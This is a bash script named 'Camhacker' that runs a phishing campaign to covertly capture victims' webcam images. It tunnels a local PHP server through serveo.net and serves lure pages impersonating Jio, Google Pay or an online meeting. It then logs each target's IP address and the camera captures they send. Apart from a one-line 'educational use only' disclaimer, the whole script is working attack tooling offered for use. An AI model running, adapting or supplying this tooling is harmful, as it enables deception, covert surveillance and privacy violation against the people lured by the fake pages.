#!/bin/bash
# Camhacker version 1.0

trap 'printf "\n"; stop' 2


banner() {
clear
printf "\e[1;91m     __  ____ ___ ___  \e[0m\e[1;77m__ __  ____    __ __  _   ___ ____ \e[0m\n"
printf "\e[1;91m    /  ]/    |   |   |\e[0m\e[1;77m|  |  |/    |  /  ]  |/ ] /  _]    \ \e[0m\n"
printf "\e[1;91m   /  /|  o  | _   _ |\e[0m\e[1;77m|  |  |  o  | /  /|  ' / /  [_|  D  )\e[0m\n"
printf "\e[1;91m  /  / |     |  \_/  |\e[0m\e[1;77m|  _  |     |/  / |    \|    _]    / \e[0m\n"
printf "\e[1;91m /   \_|  _  |   |   |\e[0m\e[1;77m|  |  |  _  /   \_|     \   [_|    \ \e[0m\n"
printf "\e[1;91m \     |  |  |   |   |\e[0m\e[1;77m|  |  |  |  \     |  .  |     |  .  \ \e[0m\n"
printf "\e[1;91m  \____|__|__|___|___|\e[0m\e[1;77m|__|__|__|__|\____|__|\_|_____|__|\__| \e[0m\n"
printf " \e[1;93m CAM-HACKER Version 1.00 \e[0m \n"
printf " \e[1;77m By shan404 \e[0m \n"
printf "\n\e[1;91m\e[1mDisclaimer: This tool is for educational use only. I am not liable for any misuse. Users are responsible for their actions.\e[0m\n"
printf "\n"


}

start() {

    server
    payload
    checkfound
}

dependencies() {
    # Check if PHP is installed
    command -v php > /dev/null 2>&1 || { printf >&2 "I require php but it's not installed. Install it. Aborting.\n"; exit 1; }
}


stop() {
    checkssh=$(pgrep -f "ssh")

    if [[ -n $checkssh ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"  # Display IP address
    cat ip.txt >> saved.ip.txt  # Append IP address to saved.ip.txt
}


checkfound() {
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for the targets, Press Ctrl + C to exit...\e[0m\n"
    
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
        fi

        sleep 0.5

        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
            rm -rf Log.log
        fi

        sleep 0.5
    done 
}



server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

    # Check if PHP is running and kill it if necessary
    if pgrep -x "php" > /dev/null; then
        killall -2 php > /dev/null 2>&1
    fi

    # Define SSH command based on subdomain response
    if [[ $subdomain_resp == true ]]; then
        ssh_command='ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink &'
    else
        ssh_command='ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink &'
    fi

    # Execute SSH command in background and wait
    $(which sh) -c "$ssh_command"
    sleep 8

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3

    # Extract and display the generated link
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$send_link"
}


select_template() {
    if ((option_server > 2 || option_server < 1)); then
        printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
        sleep 1
        clear
        banner
        camhacker
    else
        printf "\n-----Choose a template----\n"
        printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Jio\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Google Pay\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meet\e[0m\n"
        
        default_option_template="1"
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: \e[0m' option_tem
        option_tem="${option_tem:-$default_option_template}"
        
        if ((option_tem == 1)); then
            #read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
            fest_name="${fest_name//[[:space:]]/}"
        elif ((option_tem == 2)); then
            # No action needed here for this template
            :
        elif ((option_tem == 3)); then
            printf ""
        else
            printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
            sleep 1
            select_template
        fi
    fi
}


camhacker() {
    # Remove sendlink file if it exists
    [[ -e sendlink ]] && rm -rf sendlink

    printf "\n-----Choose tunnel server----\n"
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"

    # Prompt user to choose a Port Forwarding option
    default_option_server="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
    option_server="${option_server:-$default_option_server}"

    # Call select_template function
    select_template

    if [[ $option_server -eq 1 ]]; then
        # Check if PHP is installed
        command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
        start
    else
        printf "\e[1;93m [!] Invalid option!\e[0m\n"
        sleep 1
        clear
        camhacker
    fi
}


payload() {
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    sed 's+forwarding_link+'"$send_link"+'g' template.php > index.php

    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'"$link"+'g; s+fes_name+'"$fest_name"+'g' jio.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'"$link"+'g' gpay.html > index2.html
    else
        sed 's+forwarding_link+'"$link"+'g' cam.html > index2.html
    fi

    rm -rf index3.html
}


banner
dependencies
camhacker
